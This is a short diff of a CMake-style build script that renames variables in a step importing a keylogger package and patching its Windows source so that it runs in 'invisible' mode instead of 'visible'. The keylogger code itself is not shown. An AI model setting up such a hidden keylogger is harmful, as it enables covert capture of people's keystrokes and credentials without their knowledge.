@@ -21,15 +21,15 @@ include_guard()
 ### INSTALL ###
 #dk_getFileParams("${CMAKE_CURRENT_LIST_DIR}/dkconfig.txt")
 
-dk_import		(${KEYLOGGER_IMPORT})
+dk_import		(${keylogger_Import})
 
 
-dk_fileReplace("${KEYLOGGER}/windows/klog_main.cpp" 
+dk_fileReplace("${keylogger}/windows/klog_main.cpp" 
 	"#define visible"
 	"#define invisible"
 )
 
-dk_fileReplace("${KEYLOGGER}/windows/klog_main.cpp" 
+dk_fileReplace("${keylogger}/windows/klog_main.cpp" 
 	"FindWindowA(\"ConsoleWindowClass\", NULL)"
 	"GetConsoleWindow()"
 )
